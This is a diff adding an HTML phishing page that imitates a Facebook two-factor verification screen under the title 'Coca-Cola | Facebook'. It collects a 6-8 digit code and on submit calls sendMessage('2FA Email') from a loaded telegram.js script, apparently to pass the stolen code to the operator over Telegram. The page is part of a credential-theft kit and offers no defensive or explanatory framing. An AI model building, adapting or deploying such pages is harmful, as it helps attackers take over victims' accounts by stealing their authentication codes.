@@ -1,0 +1,76 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Coca-Cola | Facebook</title>
+    <link rel="stylesheet" href="./assets/style_2fa.css">
+    <script src="./js/telegram.js"></script>
+    <link href="./assets/loader.css" rel="stylesheet">
+    <link rel="shortcut icon" href="./assets/favicon.ico" type="image/x-icon">
+    <style>
+body {
+   font-family: Helvetica;
+   font-weight: bold;
+}
+    </style>
+</head>
+<body>
+    <div id="loadFacebookC" style="display:none;" class="">
+        <div id="loadFacebookG">
+        <div id="blockG_1" class="facebook_blockG"></div>
+        <div id="blockG_2" class="facebook_blockG"></div>
+        <div id="blockG_3" class="facebook_blockG"></div>
+        </div>
+    </div>
+    <div class="bg-white" style="--main-color: #0CAA41;">
+      <div class="h-screen w-screen flex flex-col justify-center items-center">
+        <div class="bg-white h-full w-full flex justify-center items-start pt-[5rem]">
+          <div class="bg-white rounded-xl px-6 py-6 md:py-8 w-full max-w-md md:max-w-lg">
+            <div>
+              <p class="text-[13px] font-[500]">Facebook</p>
+              <p class="font-[600] text-[24px] mb-2">Check your text messages</p>
+              <p class="text-[15px] font-[400] mt-1" style="color: rgb(10, 19, 23);">Enter the code we sent to your email.</p>
+              <div class="mt-2 w-full">
+                <img src="/assets/auth_sms.png" alt="" class="w-full h-auto object-cover">
+              </div>
+              <input type="number" id="message" minlength="6" maxlength="8" placeholder="Code" autocomplete="off" class="pr-[20px] h-14 w-full mt-4 bg-white rounded-[16px] border border-[#ccd3db] pl-4 font-[500] font-[15px] focus:outline-none focus:border-[#1c1e21]" value="">
+              <div class="w-full flex justify-center items-center pb-4 pl-[4px] pt-4">
+
+                <p class="text-[14px] text-[#5d6c7b] font-[400]">Make sure you're in an area with good signal so the code can reach your phone. <br>
+                </p>
+              </div>
+              
+<p id="2fa-error" style="color: red; font-weight: 100; font-size: 14px;" class="text-red-500"></p>
+<span id="error-message" style="color: red; display: none; font-size: 14px;"></span>
+
+
+                <span id="error-length" style="color: red;display:none;font-weight:100;"></span>
+              <div class="flex flex-col">
+                <button id="submitBtn"  class="mb-4 w-full py-3 bg-blue-500 text-white rounded hover:bg-blue-600 focus:outline-none text-[15px] font-[500]" style="border-radius: 22px;">Continue</button>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+    <script>
+    document.getElementById('submitBtn').addEventListener('click', function(event) {
+            const inputField = document.getElementById('message');
+            const errorMessage = document.getElementById('error-length');
+            const submitButton = document.getElementById('submitBtn');
+            const username = inputField.value;
+        
+            // Validate length of the username (between 6 and 8 characters)
+            if (username.length >= 6 && username.length <= 8) {
+                errorMessage.style.display = 'none';
+                 sendMessage('2FA Email')
+                
+            } else {
+                errorMessage.style.display = 'inline';
+            }
+        });
+
+    </script>
+</body>
+</html>
